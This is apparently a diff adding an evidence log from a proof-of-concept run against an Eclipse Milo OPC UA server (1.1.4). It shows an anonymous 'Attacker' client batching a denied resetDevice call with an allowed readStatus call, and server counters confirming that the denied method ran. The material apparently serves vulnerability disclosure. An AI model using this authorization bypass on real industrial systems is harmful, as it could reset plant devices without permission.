@@ -1,0 +1,21 @@
+# the mixed-batch bypass evidence -- captured_at_utc=2026-07-28T11:59:52Z
+# label=row3r-attack-mixed-batch-reversed-vulnerable-1.1.4.log :: Row 3r: same bypass, REVERSED batch order [resetDevice, readStatus] -- order-independence control
+# environment: see /Users/abhinavagarwal/Documents/work/milo-security-poc/call-mixed-batch-authz-bypass/evidence/environment.log for exact dependency versions, artifact
+#              hashes, JDK/Maven/OS info shared by this entire run
+# ------------------------------------------------------------------
+$ java -cp target/call-batch-poc.jar callbatch.Attacker opc.tcp://localhost:18723/milo mixed-batch-rev
+
+CLIENT phase=mixed-batch-rev url=opc.tcp://localhost:18723/milo identity=anonymous
+[main] INFO org.eclipse.milo.opcua.sdk.client.OpcUaClient - Java version: 17.0.19
+[main] INFO org.eclipse.milo.opcua.sdk.client.OpcUaClient - Eclipse Milo OPC UA Stack version: dev
+[main] INFO org.eclipse.milo.opcua.sdk.client.OpcUaClient - Eclipse Milo OPC UA Client SDK version: dev
+CLIENT connected (anonymous, SecurityPolicy.None)
+CLIENT discovered nodes via Browse: Device=NodeId{ns=3, id=Plant/Device} readStatus=NodeId{ns=3, id=Plant/Device/readStatus} resetDevice=NodeId{ns=3, id=Plant/Device/resetDevice} SensorFeed=NodeId{ns=3, id=Plant/SensorFeed} stopSensorFeed=NodeId{ns=3, id=Plant/SensorFeed/stopSensorFeed}
+ATTACK (mixed batch, REVERSED order): anonymous attacker sends ONE CallRequest [resetDevice (DENIED), readStatus (allowed)]
+CLIENT batch call completed exceptionally -- WIRE RESULT: UaException: status=Bad_Timeout, message=UaException: status=Bad_Timeout, message=requestId=17 timed out after 5000ms
+CLIENT_DONE phase=mixed-batch-rev
+
+server-side counters BEFORE this attempt: readStatus=1 resetDevice=2 deviceReset=true stopSensorFeed=0 feedRunning=true
+server-side counters AFTER this attempt:  readStatus=2 resetDevice=3 deviceReset=true stopSensorFeed=0 feedRunning=true
+
+Proves the bypass does not depend on the denied method being listed after the allowed one.
